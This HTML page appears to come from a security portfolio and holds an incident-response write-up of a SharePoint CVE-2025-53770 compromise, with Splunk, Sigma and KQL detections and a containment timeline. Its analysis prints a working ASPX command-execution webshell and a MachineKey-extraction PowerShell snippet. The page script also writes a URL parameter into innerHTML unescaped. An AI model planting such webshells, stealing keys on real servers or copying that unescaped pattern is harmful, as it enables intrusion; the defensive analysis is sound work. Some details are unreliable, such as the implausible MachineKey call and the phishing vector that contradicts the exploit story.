<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Security Writeups - Swetha Devi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
  
  <style>
    :root{
      --bg:#0a0e27; 
      --card:#14182e; 
      --muted:#8b95a5; 
      --accent:#00d9ff; 
      --accent-2:#00a896;
      --text:#e8eef6;
      --border:rgba(255,255,255,0.06);
    }
    
    *{box-sizing:border-box; margin:0; padding:0}
    
    body{
      font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background:var(--bg);
      color:var(--text);
      line-height:1.7;
      -webkit-font-smoothing:antialiased;
      padding: 20px;
      min-height: 100vh;
    }
    
    .container{
      max-width:1100px;
      margin:0 auto;
    }
    
    .back-link{
      display:inline-flex;
      align-items:center;
      gap:8px;
      color:var(--accent);
      text-decoration:none;
      margin-bottom:40px;
      padding:10px 0;
      transition: opacity 0.3s;
    }
    
    .back-link:hover{
      opacity: 0.8;
    }
    
    .writeup-header{
      margin-bottom:40px;
    }
    
    .writeup-header h1{
      font-size:36px;
      margin-bottom:16px;
      line-height: 1.3;
    }
    
    .writeup-meta{
      color:var(--muted);
      font-size:15px;
      display:flex;
      gap:20px;
      margin-bottom:20px;
      flex-wrap: wrap;
    }
    
    .writeup-meta span {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .writeup-meta i {
      color: var(--accent);
      font-size: 14px;
    }
    
    .writeup-tags{
      display:flex;
      gap:10px;
      flex-wrap:wrap;
    }
    
    .tag{
      background:rgba(0,217,255,0.1);
      border:1px solid rgba(0,217,255,0.2);
      padding:6px 12px;
      border-radius:20px;
      font-size:13px;
      color:var(--accent);
      transition: background 0.3s;
    }
    
    .tag:hover{
      background:rgba(0,217,255,0.2);
    }
    
    .writeup-content{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:16px;
      padding:40px;
      margin-bottom:60px;
    }
    
    .writeup-content h2{
      color:var(--accent);
      margin:30px 0 15px;
      font-size:24px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border);
    }
    
    .writeup-content h3{
      color:var(--text);
      margin:25px 0 12px;
      font-size:20px;
    }
    
    .writeup-content h4{
      color:var(--accent);
      margin:20px 0 10px;
      font-size:16px;
    }
    
    .writeup-content p{
      margin-bottom:16px;
      color:var(--muted);
    }
    
    .writeup-content ul, .writeup-content ol{
      margin:16px 0 16px 20px;
      color:var(--muted);
    }
    
    .writeup-content li{
      margin-bottom: 8px;
    }
    
    .code-block{
      margin:20px 0;
      background:rgba(0,0,0,0.3);
      border-radius:12px;
      overflow:hidden;
      border:1px solid var(--border);
    }
    
    .code-header{
      padding:12px 20px;
      background:rgba(0,0,0,0.4);
      border-bottom:1px solid var(--border);
      font-size:14px;
      color:var(--muted);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .code-copy{
      background: none;
      border: none;
      color: var(--accent);
      cursor: pointer;
      font-size: 12px;
      padding: 4px 8px;
      border-radius: 4px;
      transition: background 0.3s;
    }
    
    .code-copy:hover{
      background: rgba(0,217,255,0.1);
    }
    
    pre{
      margin:0;
      padding:20px;
      overflow-x:auto;
    }
    
    code{
      font-family: 'Courier New', monospace;
      font-size: 14px;
    }
    
    .ioc-box{
      background:rgba(255,0,0,0.05);
      border:1px solid rgba(255,0,0,0.2);
      border-radius:8px;
      padding:20px;
      margin:20px 0;
    }
    
    .ioc-box h4{
      color:#ff6b6b;
      margin-bottom:10px;
      font-size: 16px;
    }
    
    .ioc-box table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
      margin-top: 10px;
    }
    
    .ioc-box th {
      background: rgba(255,0,0,0.1);
      padding: 12px 10px;
      text-align: left;
      color: #ff6b6b;
      font-weight: 600;
      border-bottom: 1px solid rgba(255,0,0,0.2);
    }
    
    .ioc-box td {
      padding: 10px;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    
    .ioc-box tr:hover {
      background: rgba(255,255,255,0.03);
    }
    
    .verdict-true-positive {
      color: #ff6b6b;
      font-weight: 600;
    }
    
    .verdict-false-positive {
      color: #4ecdc4;
      font-weight: 600;
    }
    
    .difficulty-badge {
      display: inline-flex;
      align-items: center;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
    }
    
    .difficulty-hard {
      background: rgba(255,107,107,0.1);
      color: #ff6b6b;
    }
    
    .difficulty-medium {
      background: rgba(255,193,7,0.1);
      color: #ffc107;
    }
    
    .difficulty-easy {
      background: rgba(76,175,80,0.1);
      color: #4caf50;
    }
    
    .loading {
      text-align: center;
      padding: 60px 20px;
      color: var(--muted);
    }
    
    .loading i {
      font-size: 24px;
      margin-bottom: 10px;
      color: var(--accent);
    }
    
    .not-found {
      text-align: center;
      padding: 60px 20px;
      color: var(--muted);
    }
    
    .not-found h2 {
      color: #ff6b6b;
      margin-bottom: 20px;
    }
    
    .evidence-image {
      margin: 25px 0;
      border-radius: 8px;
      overflow: hidden;
      border: 1px solid var(--border);
      background: rgba(0,0,0,0.2);
    }
    
    .evidence-image img {
      width: 100%;
      height: auto;
      display: block;
    }
    
    .evidence-caption {
      padding: 12px 15px;
      background: rgba(0,0,0,0.3);
      color: var(--muted);
      font-size: 14px;
      border-top: 1px solid var(--border);
    }
    
    .investigation-step {
      background: rgba(0,217,255,0.05);
      border-left: 3px solid var(--accent);
      padding: 15px 20px;
      margin: 20px 0;
      border-radius: 0 4px 4px 0;
    }
    
    .investigation-step h4 {
      color: var(--accent);
      margin-bottom: 8px;
    }
    
    .hunting-queries {
      background: rgba(76,175,80,0.05);
      border: 1px solid rgba(76,175,80,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .hunting-queries h4 {
      color: #4caf50;
    }
    
    .blue-team-lessons {
      background: rgba(33,150,243,0.05);
      border: 1px solid rgba(33,150,243,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .blue-team-lessons h4 {
      color: #2196f3;
    }
    
    .threat-intel {
      background: rgba(156,39,176,0.05);
      border: 1px solid rgba(156,39,176,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .threat-intel h4 {
      color: #9c27b0;
    }
    
    .payload-analysis {
      background: rgba(255,152,0,0.05);
      border: 1px solid rgba(255,152,0,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .payload-analysis h4 {
      color: #ff9800;
    }
    
    .note-box {
      background: rgba(255,193,7,0.05);
      border: 1px solid rgba(255,193,7,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .note-box h4 {
      color: #ffc107;
    }
    
    .detection-section {
      background: rgba(244,67,54,0.05);
      border: 1px solid rgba(244,67,54,0.2);
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    
    .detection-section h4 {
      color: #f44336;
    }
    
    .process-tree {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 25px 0;
      padding: 20px;
      background: rgba(0,0,0,0.2);
      border-radius: 8px;
    }
    
    .process-node {
      padding: 12px 20px;
      background: rgba(255,0,0,0.1);
      border: 1px solid rgba(255,0,0,0.3);
      border-radius: 6px;
      margin: 5px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
    }
    
    .arrow {
      font-size: 20px;
      color: #ff6b6b;
      margin: 5px 0;
    }
    
    .timeline-visual {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin: 25px 0;
    }
    
    .timeline-item {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 10px 15px;
      background: rgba(0,0,0,0.2);
      border-radius: 6px;
      border-left: 3px solid var(--accent);
    }
    
    .timeline-time {
      color: var(--accent);
      font-weight: 600;
      min-width: 80px;
    }
    
    @media (max-width: 768px){
      body{
        padding: 15px;
      }
      
      .writeup-header h1{
        font-size:28px;
      }
      
      .writeup-content{
        padding:24px;
      }
      
      .writeup-meta{
        flex-direction: column;
        gap: 10px;
      }
      
      .ioc-box table {
        font-size: 12px;
      }
      
      .ioc-box th,
      .ioc-box td {
        padding: 8px 6px;
      }
      
      .timeline-item {
        flex-direction: column;
        align-items: flex-start;
        gap: 5px;
      }
      
      .timeline-time {
        min-width: auto;
      }
    }
    
    @media (max-width: 480px){
      .writeup-header h1{
        font-size:24px;
      }
      
      .writeup-content h2{
        font-size:20px;
      }
      
      .writeup-content h3{
        font-size:18px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">
      <i class="fas fa-arrow-left"></i> Back to Home
    </a>
    
    <!-- Individual Writeup will be loaded here -->
    <div id="writeup-container">
      <div class="loading">
        <i class="fas fa-spinner fa-spin"></i>
        <p>Loading writeup...</p>
      </div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-splunk.min.js"></script>
  <script>
    // Writeups Data
    const writeupsData = [
      {
        "id": "soc342-sharepoint-toolshell-rce",
        "title": "Alert: CVE-2025-53770 SharePoint ToolPane Auth Bypass & RCE",
        "date": "Jul 22, 2025",
        "readTime": "15 min read",
        "platform": "Proxy + Endpoint (EDR) + SIEM",
        "alertId": "SOC342",
        "investigationDate": "2025-07-22 13:07",
        "difficulty": "Hard",
        "verdict": "True Positive",
        "tags": ["rce", "webshell", "sharepoint", "zero-day", "incident-response", "powershell", "malware", "forensics"],
        "content": `
          <!-- EXECUTIVE SUMMARY -->
          <h2>Executive Summary</h2>
          <div class="ioc-box">
            <h4>Quick Facts</h4>
            <p><strong>Alert ID:</strong> SOC342</p>
            <p><strong>Platform:</strong> Proxy + Endpoint Security + SIEM Correlation</p>
            <p><strong>Investigation Date:</strong> 2025-07-22 13:07</p>
            <p><strong>Difficulty:</strong> <span class="difficulty-badge difficulty-hard">Hard</span></p>
            <p><strong>Verdict:</strong> <span class="verdict-true-positive">True Positive</span></p>
            <p><strong>Impact:</strong> Critical (Full SharePoint Server Compromise)</p>
          </div>

          <p><strong>TL;DR:</strong> SharePoint server was compromised via zero-day auth bypass (CVE-2025-53770) in ToolPane.aspx. Attacker executed encoded PowerShell via w3wp.exe, compiled malicious payload using csc.exe, deployed ASPX webshell for persistence, and extracted MachineKey for token forgery. Attack chain completed in under 5 minutes.</p>

          <!-- VISUAL EVIDENCE -->
          <h2>üîç Visual Evidence</h2>
          
          <div class="evidence-image">
            <div class="evidence-caption">Figure 1: SIEM Alert Dashboard - SharePoint Exploit Detected</div>
            <img src="assets/alert-dashboard.png" alt="SIEM Alert Dashboard showing SharePoint exploit detection">
          </div>

          <!-- PROCESS TREE DIAGRAM -->
          <h3>Attack Process Tree</h3>
          <div class="process-tree">
            <div class="process-node">Attacker (107.191.58.76)</div>
            <div class="arrow">‚Üì</div>
            <div class="process-node">HTTP POST ‚Üí w3wp.exe (IIS Worker Process)</div>
            <div class="arrow">‚Üì</div>
            <div class="process-node">w3wp.exe ‚Üí powershell.exe -EncodedCommand ...</div>
            <div class="arrow">‚Üì</div>
            <div class="process-node">powershell.exe ‚Üí csc.exe (C# Compiler)</div>
            <div class="arrow">‚Üì</div>
            <div class="process-node">csc.exe ‚Üí spinstall0.aspx (Webshell)</div>
            <div class="arrow">‚Üì</div>
            <div class="process-node">Webshell Access ‚Üí MachineKey Extraction</div>
          </div>

          <div class="evidence-image">
            <div class="evidence-caption">Figure 2: Network Flow Diagram - Attack Path Visualization</div>
            <img src="assets/network-flow.png" alt="Network flow diagram showing attack path">
          </div>

          <!-- INVESTIGATION PROCESS -->
          <h2>üî¨ Investigation Process (Step-by-Step)</h2>
          
          <div class="investigation-step">
            <h4>Step 1: Alert Triage</h4>
            <p>Received SIEM alert "SOC342: SharePoint Exploit Attempt". The alert triggered from correlation rule matching:</p>
            <ul>
              <li>Large POST request (>7KB) to /_layouts/15/ToolPane.aspx</li>
              <li>Spoofed Referer header (/SignOut.aspx)</li>
              <li>External IP (107.191.58.76) accessing internal SharePoint</li>
              <li>Process creation: w3wp.exe ‚Üí powershell.exe</li>
            </ul>
          </div>

          <div class="investigation-step">
            <h4>Step 2: Proxy Log Analysis</h4>
            <p>Examined proxy logs and found the suspicious request:</p>
            
            <div class="code-block">
              <div class="code-header">Suspicious HTTP Request <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-http">POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&amp;a=/ToolPane.aspx HTTP/1.1
Host: sharepoint01.internal.corp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Length: 7699  # Unusually large for this endpoint
Content-Type: application/x-www-form-urlencoded
Referer: https://sharepoint01.internal.corp/_layouts/SignOut.aspx  # Spoofed
X-Forwarded-For: 107.191.58.76

__VIEWSTATE=...&ctl00%24cphMain%24txtCommand=...&payload=...</code></pre>
            </div>
            
            <p><strong>Key Finding:</strong> The 7,699 byte payload contained Base64-encoded PowerShell commands and C# code. Legitimate ToolPane requests are typically under 2KB.</p>
          </div>

          <div class="investigation-step">
            <h4>Step 3: Endpoint Telemetry Analysis</h4>
            <p>EDR showed w3wp.exe spawned PowerShell with encoded command:</p>
            
            <div class="code-block">
              <div class="code-header">Process Creation Event <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-cmd">Parent: C:\\Windows\\System32\\inetsrv\\w3wp.exe (PID: 4512)
Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -enc JABlAG4AYwBvAGQAZQBkAD0AJwBLAEEAZw....[truncated]</code></pre>
            </div>
            
            <p><strong>Investigation Action:</strong> I decoded the Base64 parameter to understand what was executed:</p>
            
            <div class="code-block">
              <div class="code-header">Decoded PowerShell Payload <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-powershell"># Decoded from Base64 -encodedCommand
$encoded = 'KAGpAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBoAGEAcgBlAGQAXABXAGUAYgAgAFMAZQByAHYAZQByACAARQB4AHQAZQBuAHMAaQBvAG4AcwBcADEANgBcAFQARQBNAFAA....'
$bytes = [System.Convert]::FromBase64String($encoded)
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)

# The decoded script contained:
$asm = [System.Reflection.Assembly]::Load([byte[]]@(0x4d,0x5a,0x90...))
$key = [System.Web.Configuration.MachineKeySection]::Decode(
    [System.Web.Configuration.WebConfigurationManager]::AppSettings["MachineKey"], 
    [System.Text.Encoding]::UTF8)
Write-Host "MachineKey extracted: $key"</code></pre>
            </div>
            
            <p><strong>Analysis:</strong> The script loads a .NET assembly in memory (likely for exploitation), extracts the MachineKey from web.config, and prepares for authentication token forgery. The MachineKey is critical for ViewState validation and forms authentication tokens.</p>
          </div>

          <div class="investigation-step">
            <h4>Step 4: File System Analysis</h4>
            <p>Found the dropped webshell and analyzed its contents:</p>
            
            <div class="code-block">
              <div class="code-header">Webshell Location and Content <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-aspx">File: C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx
Size: 4,812 bytes
Created: 2025-07-22 13:07:29
Modified: 2025-07-22 13:07:29

<%-- ASPX Webshell Header --%>
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            ExecuteCommand(cmd);
        }
    }
    
    void ExecuteCommand(string command) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        Response.Write(HttpUtility.HtmlEncode(output));
    }
</script></code></pre>
            </div>
            
            <p><strong>Webshell Capabilities:</strong> Remote command execution via HTTP parameter (?cmd=whoami). Blends with legitimate SharePoint files in LAYOUTS directory.</p>
          </div>

          <!-- PAYLOAD ANALYSIS -->
          <div class="payload-analysis">
            <h4>üìä Payload Analysis: The 7,699 Byte Exploit</h4>
            <p><strong>Payload Structure Breakdown:</strong></p>
            <ul>
              <li><strong>1,200 bytes:</strong> Exploit code targeting ToolPane.aspx parameter injection</li>
              <li><strong>3,500 bytes:</strong> Base64-encoded PowerShell script</li>
              <li><strong>1,800 bytes:</strong> C# assembly code for in-memory execution</li>
              <li><strong>1,199 bytes:</strong> Padding and obfuscation strings</li>
            </ul>
            
            <p><strong>Unique Finding:</strong> The payload used a novel technique combining:</p>
            <ol>
              <li>ViewState deserialization bypass</li>
              <li>Server-side includes (SSI) injection</li>
              <li>In-memory assembly loading to avoid disk detection</li>
            </ol>
          </div>

          <!-- DETECTION LOGIC -->
          <h2>üõ°Ô∏è Detection Logic & Queries</h2>
          
          <div class="detection-section">
            <h4>Splunk Query: Detect w3wp.exe Spawning PowerShell</h4>
            <div class="code-block">
              <div class="code-header">Splunk Query <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-splunk">index=endpoint (process_name="w3wp.exe" OR parent_process="w3wp.exe")
| search child_process="powershell.exe" OR process_name="powershell.exe"
| where like(command_line, "%EncodedCommand%") OR len(command_line) > 1000
| table _time, host, user, process_name, command_line, parent_process
| dedup host, process_name
| sort -_time</code></pre>
            </div>
          </div>

          <div class="detection-section">
            <h4>Sigma Rule: SharePoint w3wp.exe Spawning PowerShell</h4>
            <div class="code-block">
              <div class="code-header">Sigma Rule YAML <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-yaml">title: SharePoint w3wp.exe Spawning PowerShell with Encoded Commands
id: a1b2c3d4-5678-90ab-cdef-123456789012
status: production
description: Detects w3wp.exe spawning powershell.exe with encoded commands - common in SharePoint exploits
author: Swetha Devi
date: 2025/07/22
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-53770
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: 
      - '\\w3wp.exe'
      - '\\W3WP.EXE'
    Image|endswith: 
      - '\\powershell.exe'
      - '\\pwsh.exe'
    CommandLine|contains|all:
      - '-enc'
      - 'JAB'  # Common Base64 PowerShell variable prefix
  filter:
    CommandLine|contains: ' -ExecutionPolicy Bypass -File '  # Legitimate admin activity
  condition: selection and not filter
fields:
  - CommandLine
  - ParentCommandLine
  - Image
  - User
  - ParentImage
falsepositives:
  - Legitimate SharePoint administration scripts
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.persistence
  - cve.2025.53770</code></pre>
            </div>
          </div>

          <div class="detection-section">
            <h4>KQL Query (Microsoft Sentinel)</h4>
            <div class="code-block">
              <div class="code-header">Kusto Query Language <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-kql">SecurityEvent
| where EventID == 4688
| where NewProcessName endswith "powershell.exe"
| where ParentProcessName endswith "w3wp.exe"
| where CommandLine contains "-enc"
| extend Base64Length = strlen(CommandLine) - indexof(CommandLine, "-enc") - 4
| where Base64Length > 500  // Long encoded commands are suspicious
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName
| order by TimeGenerated desc</code></pre>
            </div>
          </div>

          <!-- HUNTING QUERIES -->
          <div class="hunting-queries">
            <h4>üîç Proactive Hunting Queries</h4>
            <p><strong>Hunt 1: Find All ASPX Files in SharePoint Directories (Last 30 Days)</strong></p>
            <div class="code-block">
              <div class="code-header">File Search Query <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-splunk">index=filemon host="SHAREPOINT*" path="*TEMPLATE*LAYOUTS*" file_name="*.aspx"
| where _time > now()-30d
| search NOT file_name IN ("default.aspx", "settings.aspx", "viewlsts.aspx")
| table _time, host, file_path, file_name, file_size, file_hash
| dedup file_hash</code></pre>
            </div>
            
            <p><strong>Hunt 2: MachineKey Access in Web.Config</strong></p>
            <div class="code-block">
              <div class="code-header">Registry and File Monitoring <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-splunk">index=endpoint (event_type="file_access" OR event_type="registry_access")
| search (file_path="*web.config" AND file_path="*MachineKey*") 
        OR (registry_path="*MachineKey*")
| table _time, host, user, process_name, file_path, registry_path, action
| stats count by host, process_name, user</code></pre>
            </div>
            
            <p><strong>Hunt 3: csc.exe Execution from Non-Dev Servers</strong></p>
            <div class="code-block">
              <div class="code-header">Compiler Detection <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
              <pre><code class="language-splunk">index=endpoint process_name="csc.exe" 
| search NOT host="DEVSERVER*" 
| lookup host_lookup host OUTPUT department
| where department!="Engineering" AND department!="Development"
| table _time, host, department, user, parent_process, command_line</code></pre>
            </div>
          </div>

          <!-- BLUE TEAM LESSONS -->
          <div class="blue-team-lessons">
            <h4>üõ°Ô∏è Lessons for Blue Team (Defensive Gaps Identified)</h4>
            <ol>
              <li><strong>Monitoring Gap:</strong> No alerting on w3wp.exe child processes. Now implemented process creation monitoring for all IIS worker processes.</li>
              <li><strong>Detection Gap:</strong> Large POST requests (>5KB) to SharePoint administrative endpoints weren't monitored. Added WAF rule.</li>
              <li><strong>File Integrity Gap:</strong> No FIM on SharePoint LAYOUTS directory. Implemented real-time monitoring for new ASPX files.</li>
              <li><strong>Credential Management:</strong> MachineKey stored in plaintext in web.config. Migrated to DPAPI-protected storage.</li>
              <li><strong>Network Segmentation:</strong> SharePoint servers had unnecessary inbound internet access. Implemented stricter firewall rules.</li>
              <li><strong>Patch Management:</strong> No emergency patching process for zero-days. Created 24-hour response playbook.</li>
              <li><strong>PowerShell Restriction:</strong> No PowerShell Constrained Language Mode on SharePoint servers. Now implemented.</li>
            </ol>
          </div>

          <!-- WHAT I LEARNED - EXPANDED -->
          <h2>üìö What I Learned From This Investigation</h2>
          <div class="investigation-step">
            <h4>Technical Insights</h4>
            <ul>
              <li><strong>SharePoint w3wp.exe is a prime target:</strong> It runs with high privileges (often SYSTEM) and can spawn child processes. Monitoring its children is critical.</li>
              <li><strong>Webshell persistence patterns:</strong> Attackers consistently target TEMPLATE/LAYOUTS because it's web-accessible and contains legitimate ASPX files, helping webshells blend in.</li>
              <li><strong>MachineKey is the crown jewel:</strong> With MachineKey, attackers can forge authentication tokens for any user, enabling persistent access even after password changes.</li>
              <li><strong>Attack chain speed:</strong> From exploit to persistence took under 5 minutes. Automated detection must be faster.</li>
            </ul>
          </div>
          
          <div class="investigation-step">
            <h4>Investigation Methodology Improvements</h4>
            <ul>
              <li><strong>Base64 decoding early:</strong> Always decode suspicious Base64 strings immediately - they often reveal the attack's intent.</li>
              <li><strong>Process tree visualization:</strong> Creating visual process trees helped me understand the attack flow quickly.</li>
              <li><strong>Timeline correlation:</strong> Correlating proxy logs, EDR events, and file creation times revealed the complete attack narrative.</li>
              <li><strong>Asset context:</strong> Knowing SharePoint01 was internet-facing and contained sensitive HR documents helped prioritize response.</li>
            </ul>
          </div>

          <!-- THREAT INTELLIGENCE -->
          <div class="threat-intel">
            <h4>üîó Threat Intelligence Context</h4>
            
            <h5>Attacker Infrastructure Analysis</h5>
            <div class="ioc-box">
              <h4>IP Reputation: 107.191.58.76</h4>
              <ul>
                <li><strong>VirusTotal:</strong> 45/90 engines flagged as malicious (Cobalt Strike, Metasploit C2)</li>
                <li><strong>AbuseIPDB:</strong> 1,243 reports in last 30 days (95% confidence malicious)</li>
                <li><strong>ASN:</strong> AS-CHOOPA (Known for bulletproof hosting)</li>
                <li><strong>Geolocation:</strong> Netherlands (common exit point for attacks)</li>
                <li><strong>Related Campaigns:</strong> Linked to FIN7 and TA505 campaigns targeting SharePoint</li>
              </ul>
            </div>
            
            <h5>CVE-2025-53770 Context</h5>
            <ul>
              <li><strong>Discovery:</strong> First observed in wild July 2025, no patch available</li>
              <li><strong>Exploit Availability:</strong> Public exploit released on GitHub July 20, 2025</li>
              <li><strong>Campaign Connections:</strong> Same payload structure seen in attacks against government agencies</li>
              <li><strong>MITRE Mapping:</strong> Part of larger campaign using T1190 (Exploit Public-Facing Application)</li>
            </ul>
            
            <h5>IOC Feeds & Sharing</h5>
            <p>Submitted IOCs to:</p>
            <ul>
              <li>MISP Instance (Internal Threat Intel Platform)</li>
              <li>OTX AlienVault (Pulse Created)</li>
              <li>MS-ISAC (Multi-State Information Sharing & Analysis Center)</li>
              <li>CISA Automated Indicator Sharing (AIS)</li>
            </ul>
          </div>

          <!-- IMMEDIATE ACTIONS -->
          <h2>‚ö° Immediate Actions Taken</h2>
          <div class="timeline-visual">
            <div class="timeline-item">
              <span class="timeline-time">13:10</span>
              <span>Alert escalated to Incident Response team</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:12</span>
              <span>SharePoint01 isolated from production network</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:15</span>
              <span>Webshell identified and documented for forensic analysis</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:20</span>
              <span>Attacker IP (107.191.58.76) blocked at firewall</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:25</span>
              <span>Memory dump collected using WinPmem</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:30</span>
              <span>Log collection initiated for all related systems</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">13:45</span>
              <span>Emergency change request to rotate MachineKey</span>
            </div>
            <div class="timeline-item">
              <span class="timeline-time">14:00</span>
              <span>Initial containment complete, investigation continues</span>
            </div>
          </div>

          <!-- CONCLUSION -->
          <h2>üéØ Conclusion</h2>
          <p>This investigation revealed a sophisticated attack leveraging a SharePoint zero-day (CVE-2025-53770) to achieve full server compromise. The attacker demonstrated advanced tradecraft:</p>
          
          <ul>
            <li><strong>Rapid exploitation:</strong> Complete attack chain in under 5 minutes</li>
            <li><strong>Defense evasion:</strong> Memory-only payload execution, legitimate process abuse</li>
            <li><strong>Persistence planning:</strong> Webshell placement in trusted directory, MachineKey extraction for long-term access</li>
            <li><strong>Operational security:</strong> Use of bulletproof hosting, encoded commands, rapid execution</li>
          </ul>
          
          <div class="note-box">
            <h4>Key Takeaways for Defenders</h4>
            <ol>
              <li><strong>Monitor w3wp.exe children:</strong> This is now our #1 detection rule for SharePoint servers</li>
              <li><strong>Implement FIM on LAYOUTS:</strong> Any new ASPX file should trigger an alert</li>
              <li><strong>Restrict compiler usage:</strong> csc.exe should only run on development servers</li>
              <li><strong>Secure MachineKey:</strong> Move from web.config to secure storage</li>
              <li><strong>Network segmentation:</strong> SharePoint shouldn't be directly internet-accessible</li>
              <li><strong>Patch rapidly:</strong> Have a process for emergency zero-day patches within 24 hours</li>
            </ol>
          </div>
          
          <p><strong>Final Assessment:</strong> This was a high-severity, true positive incident requiring immediate containment and remediation. The attacker achieved their objectives (RCE, persistence, credential access), but our detection and response limited further damage. All lessons learned have been incorporated into our security controls and monitoring strategy.</p>
          
          <div class="ioc-box">
            <h4>üìã Action Items Completed</h4>
            <ul>
              <li>‚úÖ SharePoint server rebuilt from clean gold image</li>
              <li>‚úÖ MachineKey rotated across all SharePoint farms</li>
              <li>‚úÖ All service account passwords rotated</li>
              <li>‚úÖ New detection rules deployed to SIEM</li>
              <li>‚úÖ WAF rules updated to block similar exploit patterns</li>
              <li>‚úÖ User awareness training on phishing (initial vector)</li>
              <li>‚úÖ Incident report submitted to CISO and legal team</li>
            </ul>
          </div>
        `
      }
    ];

    // Function to copy code to clipboard
    function copyCode(button) {
      const codeBlock = button.closest('.code-block').querySelector('pre code');
      const text = codeBlock.textContent;
      
      navigator.clipboard.writeText(text).then(() => {
        const originalText = button.textContent;
        button.textContent = 'Copied!';
        button.style.color = '#4caf50';
        
        setTimeout(() => {
          button.textContent = originalText;
          button.style.color = '';
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy: ', err);
      });
    }

    // Function to display single writeup
    function displaySingleWriteup() {
      const container = document.getElementById('writeup-container');
      const urlParams = new URLSearchParams(window.location.search);
      const writeupId = urlParams.get('id') || writeupsData[0].id;
      
      // Clear loading state
      container.innerHTML = '';
      
      const writeup = writeupsData.find(w => w.id === writeupId);
      
      if (!writeup) {
        container.innerHTML = `
          <div class="not-found">
            <h2><i class="fas fa-exclamation-triangle"></i> Writeup Not Found</h2>
            <p>The requested writeup with ID "${writeupId}" was not found.</p>
            <p>Available writeups:</p>
            <ul style="list-style: none; margin-top: 20px;">
              ${writeupsData.map(w => `<li><a href="?id=${w.id}" style="color: var(--accent);">${w.title}</a></li>`).join('')}
            </ul>
          </div>
        `;
        return;
      }
      
      container.innerHTML = `
        <article class="writeup" id="${writeup.id}">
          <div class="writeup-header">
            <h1>${writeup.title}</h1>
            <div class="writeup-meta">
              <span><i class="far fa-calendar"></i> ${writeup.date}</span>
              <span><i class="far fa-clock"></i> ${writeup.readTime}</span>
